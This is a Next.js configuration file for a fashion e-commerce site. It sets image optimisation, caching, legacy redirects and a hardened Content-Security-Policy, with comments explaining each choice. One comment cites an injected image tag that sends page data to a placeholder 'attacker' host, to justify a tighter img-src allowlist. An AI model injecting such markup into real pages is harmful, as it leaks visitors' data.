const path = require('path');
/** @type {import('next').NextConfig} */
const nextConfig = {
  poweredByHeader: false,
  // Where the build is written. The deploy sets NEXT_DIST_DIR so a build lands
  // in a folder the live site is not reading, and only the finished result is
  // swapped in; `next start` runs without it and serves .next as always.
  //
  // It used to build straight into .next while the running server served from
  // that same folder. For the two or three minutes a build takes, the live
  // site's JavaScript chunks were being deleted and rewritten underneath it,
  // and a shopper who loaded a page in that window got a blank screen — the
  // deploy comment promised "no downtime", which was true of the backend
  // (it publishes elsewhere) and never true of the frontend.
  distDir: process.env.NEXT_DIST_DIR || '.next',
  ...(process.env.NEXT_OUTPUT_STANDALONE === 'true' ? { output: 'standalone' } : {}),
  // CQ-1: Build errors should surface — removed ignoreBuildErrors and ignoreDuringBuilds
  typescript: { ignoreBuildErrors: false },
  eslint: { ignoreDuringBuilds: false },
  webpack: (config) => {
    config.resolve.alias['@'] = path.resolve(__dirname);
    return config;
  },
  // CQ-2: Specific allowed image domains instead of wildcard **
  images: {
    // AVIF hata diya, sirf WebP.
    //
    // Jo photo pehli baar maangi jati hai use yahin banaya jata hai — original
    // kholo, chhota karo, phir encode. AVIF ka encode WebP se kai guna mehnga
    // hai (ek seedhe naap me 1080x1440 par AVIF 339ms, WebP 152ms — aur VPS ka
    // core is naap wale se kahin dheema hai). Isi wajah se product ke panne par
    // dhundhli jagah-bharne wali copy to turant aa jati thi (64px, palak jhapakte
    // ban jati hai) aur asli photo chaar-paanch second baad. Shopper ke liye wo
    // chaar second "site chal hi nahi rahi" hote hain.
    //
    // Keemat: WebP ki file AVIF se thodi badi hoti hai. Ek photo jo der se aaye
    // usse thodi badi photo jo turant aaye behtar hai.
    formats: ['image/webp'],
    // Sirf itni chaudai banti hain. Next default me 1920, 2048 aur 3840 tak
    // jata hai — par asli photo hi kareeb 1200px ki hai, to us se badi maang
    // par woh use KHEENCHKAR bada karta hai: detail ek bhi nahi badhti, bas
    // encode mehnga aur file bhari ho jati hai. Teen mangwaayi (DPR 3) wale
    // foan 1200 maangte the, jo kabhi pehle se bana hi nahi hota tha.
    //
    // Ab sabse badi 1080 hai, aur deploy ke waqt yahi chaaron pehle se bana
    // di jati hain (deploy.sh), isliye kisi bhi shopper ko banne ka intezar
    // nahi karna padta.
    deviceSizes: [640, 828, 1080],
    // Every product photo filename ends in the millisecond it was uploaded, so
    // a given URL can never point at different bytes. A one-day TTL meant the
    // optimiser went STALE daily and re-resized all 84 photos to produce the
    // same output; 30 days stops that.
    minimumCacheTTL: 2592000,
    remotePatterns: [
      { protocol: 'https', hostname: '*.cloudinary.com' },
      { protocol: 'https', hostname: '*.amazonaws.com' },
      { protocol: 'https', hostname: 'mahalaxmifashionhub.com' },
      { protocol: 'https', hostname: '*.mahalaxmifashionhub.com' },
      { protocol: 'http', hostname: 'localhost' },
    ],
  },
  async rewrites() {
    return [
      {
        source: '/api/:path*',
        destination: `${process.env.NEXT_PUBLIC_API_URL ?? 'http://localhost:5000/api'}/:path*`,
      },
    ];
  },
  async headers() {
    return [
      {
        // Static images: cache 7 days at the browser/CDN edge, then revalidate in
        // the background. Product photos rarely change under the same filename.
        source: '/:all*(svg|jpg|jpeg|png|webp|avif|gif|ico)',
        headers: [
          { key: 'Cache-Control', value: 'public, max-age=604800, stale-while-revalidate=86400' },
        ],
      },
      {
        source: '/:path*',
        headers: [
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
          { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
          { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains; preload' },
          // Content-Security-Policy: XSS defense-in-depth. Allowlists exactly the external
          // sources this site uses — GA4/GTM, Meta Pixel, Razorpay checkout, Cloudinary/HTTPS
          // images, Google Fonts. 'unsafe-inline' is required because the app uses inline
          // <script> (GA/GTM/FB init) and many inline style props; even so, this still blocks
          // arbitrary external scripts, clickjacking (frame-ancestors), and forces HTTPS.
          // If a feature breaks after deploy, the browser console names the blocked source —
          // add its domain to the matching directive below.
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              // googleadservices + googleads.g.doubleclick are the Google Ads
              // conversion and remarketing tag. They were missing, so every
              // conversion the shop paid for was blocked at the browser before
              // it could be counted — the console said so on every page load,
              // under four React errors that turned out to be harmless.
              "script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://www.google-analytics.com https://www.googleadservices.com https://googleads.g.doubleclick.net https://checkout.razorpay.com https://cdn.razorpay.com https://connect.facebook.net https://static.cloudflareinsights.com https://sdk.cashfree.com",
              "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
              "font-src 'self' data: https://fonts.gstatic.com",
              // img-src was "https:", which allowed an image from ANY https host.
              // That is the hole an injected <img src="https://attacker/?d=..."> uses
              // to carry a page's contents out — the request leaves before anything
              // can stop it, and no image has to come back for the theft to work.
              //
              // Every host below was found by reading the code, not guessed:
              //   own domain      — product photos, uploaded customer photos and
              //                     review photos are all served from here
              //                     (next/image proxies through /_next/image, which
              //                     is same-origin, so its remote hosts need no entry)
              //   api.qrserver.com — the QR square on the printed shipping label
              //                     (lib/orderLabel.ts); the only outside image the
              //                     code itself asks for
              //   facebook        — the Meta Pixel reports by fetching a 1x1 GIF
              //                     from facebook.com/tr
              //   google-analytics, googletagmanager, googleadservices,
              //   doubleclick, google.com/.co.in
              //                   — GA4 and the Google Ads conversion and
              //                     remarketing pixels, same 1x1 trick
              //   razorpay, cashfree — logos the checkout script paints onto the page
              //   cloudinary, amazonaws — the hosts images.remotePatterns allows,
              //                     kept so a plain <img> to either still works
              //
              // If something stops appearing after this, the browser console names
              // the blocked host in full. Add that one host here — never "https:".
              "img-src 'self' data: blob: "
                + "https://mahalaxmifashionhub.com https://www.mahalaxmifashionhub.com "
                + "https://api.qrserver.com "
                + "https://www.facebook.com https://*.facebook.com "
                + "https://www.google-analytics.com https://*.google-analytics.com "
                + "https://www.googletagmanager.com "
                + "https://www.googleadservices.com https://googleads.g.doubleclick.net "
                // ad.doubleclick.net is Google Ads' conversion linker, and it was
                // being blocked: *.g.doubleclick.net does not cover it. It is in
                // connect-src already; the pixel it also draws needs this too.
                + "https://ad.doubleclick.net "
                + "https://stats.g.doubleclick.net https://*.g.doubleclick.net "
                + "https://www.google.com https://www.google.co.in "
                + "https://cdn.razorpay.com https://*.razorpay.com "
                + "https://*.cashfree.com "
                + "https://res.cloudinary.com https://*.cloudinary.com https://*.amazonaws.com",
              "connect-src 'self' https://www.google-analytics.com https://region1.google-analytics.com https://analytics.google.com https://www.googletagmanager.com https://api.razorpay.com https://lumberjack.razorpay.com https://connect.facebook.net https://*.facebook.com https://static.cloudflareinsights.com https://*.merchant-center-analytics.goog https://*.google.com https://*.cashfree.com https://sdk.cashfree.com https://stats.g.doubleclick.net https://*.g.doubleclick.net https://www.googleadservices.com https://ad.doubleclick.net",
              // www.facebook.com: when a browser blocks third-party cookies the
              // Pixel stops using an image beacon and falls back to a hidden
              // iframe plus a form POST to facebook.com/tr. Both were blocked
              // here, so the Pixel initialised, fired, and delivered nothing —
              // which is why not one beacon was leaving a product page.
              "frame-src https://checkout.razorpay.com https://api.razorpay.com https://*.razorpay.com https://*.cashfree.com https://sdk.cashfree.com https://www.google.com https://maps.google.com https://www.facebook.com",
              "object-src 'none'",
              "base-uri 'self'",
              "form-action 'self' https://*.cashfree.com https://payments.cashfree.com https://sandbox.cashfree.com https://*.razorpay.com https://api.razorpay.com https://www.facebook.com",
              "frame-ancestors 'none'",
              "upgrade-insecure-requests",
            ].join('; '),
          },
        ],
      },
    ];
  },
  async redirects() {
    const legacy = [
      ['index.html', '/'],
      ['about-us.html', '/about-us'],
      ['contact.html', '/contact'],
      ['best-sellers.html', '/best-sellers'],
      ['saree.html', '/products?category=saree'],
      ['women.html', '/women'],
      ['men.html', '/men'],
      ['nighty.html', '/products?category=nighty'],
      ['petticoat.html', '/products?category=petticoat'],
      ['popline.html', '/products?category=popline'],
      ['nighty-cloth.html', '/products?category=nighty-cloth'],
      ['products.php', '/products'],
      ['wishlist.html', '/wishlist'],
      ['tracking.html', '/tracking'],
      ['checkout-shipping.html', '/checkout'],
      ['checkout-payment.html', '/checkout'],
      ['create-account.html', '/account/register'],
      ['customer-account.html', '/account'],
      ['account-edit.html', '/account/edit'],
      ['address-new.html', '/account/address'],
      ['order-history.html', '/orders'],
      ['downloadable-products.html', '/account/downloads'],
      ['newsletter-manage.html', '/account/newsletter'],
      ['saved-cards.html', '/account/saved-cards'],
      ['reviews.html', '/reviews'],
      ['privacy-policy.html', '/privacy-policy'],
      ['return-policy.html', '/return-policy'],
      ['return-exchange.html', '/return-exchange'],
      ['cancellation-policy.html', '/cancellation-policy'],
      ['shipping-delivery-policy.html', '/shipping-delivery-policy'],
      ['terms-conditions.html', '/terms-conditions'],
      ['safety-center.html', '/safety-center'],
      ['admin-login.html', '/admin/login'],
      ['admin.html', '/admin'],
      ['admin-orders.html', '/admin/orders'],
      ['admin-products.html', '/admin/products'],
      ['admin-product-add.html', '/admin/products'],
      ['admin-reports.html', '/admin/reports'],
      ['admin-account-recovery.html', '/admin/login'],
      ['admin-forgot-password.php', '/admin/login'],
      ['admin-recovery.php', '/admin/login'],
      ['mfh-portal-auth.html', '/forgot-password'],
    ];

    // CQ-7: permanent: true for SEO-correct 301 redirects (old PHP/HTML URLs)
    return [
      {
        source: '/:path*',
        has: [{ type: 'host', value: 'mahalaxmifashionhub.com' }],
        destination: 'https://www.mahalaxmifashionhub.com/:path*',
        permanent: true,
      },
      ...legacy.map(([source, destination]) => ({
        source: `/${source}`,
        destination,
        permanent: true,
      })),
      // Wapsi ke do panne the - /return-policy aur /return-exchange - aur dono
      // par kareeb kareeb wahi likha tha. Google ke liye ye do nakal wale panne
      // hain, aur rakhne wale ke liye do jagah jahan niyam alag ho jate hain
      // (jaisa abhi hua bhi: ek par purani shart padi thi). Ek hi panna rahega.
      { source: '/return-policy', destination: '/return-exchange', permanent: true },
    ];
  },
};

module.exports = nextConfig;
